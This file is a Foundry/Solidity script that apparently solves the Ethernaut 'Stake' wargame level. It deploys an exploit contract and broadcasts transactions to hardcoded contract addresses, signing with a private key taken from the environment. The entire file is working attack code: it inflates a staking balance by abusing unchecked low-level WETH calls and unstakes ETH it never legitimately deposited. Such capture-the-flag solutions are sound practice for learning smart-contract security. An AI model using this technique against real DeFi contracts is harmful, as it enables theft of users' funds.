// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
// import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "src/31-Stake.sol";

contract Exploit {
    address StakeInstance;
    address WethInstance;

    constructor(address _stake, address _weth) {
        StakeInstance = _stake;
        WethInstance = _weth;
    }

    function pwn() external payable {
        WethInstance.call(abi.encodeWithSignature("approve(address,uint256)", StakeInstance, type(uint256).max));
        StakeInstance.call(abi.encodeWithSignature("StakeWETH(uint256)", 0.001 ether + 1));
        StakeInstance.call{value: 0.001 ether + 2}(abi.encodeWithSignature("StakeETH()"));
        StakeInstance.call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether));
    }

    receive() external payable {
        selfdestruct(payable(tx.origin));
    }
}

contract Exp is Script {
    address public constant StakeInstance = 0x579a8047AC30771988bBFBDED2fAf7e290ADA085;
    address public constant WethInstance = 0x42A09C3fbfb22774936B5D5d085e2FA7963b0db8; 
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));

    function run() public {
        vm.startBroadcast(hacker);

        StakeInstance.call{value: 0.001 ether + 1}(abi.encodeWithSignature("StakeETH()"));
        StakeInstance.call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether + 1));

        Exploit Exploit = new Exploit(StakeInstance, WethInstance);
        Exploit.pwn{value: 0.001 ether + 2}();

        vm.stopBroadcast();
    }
}

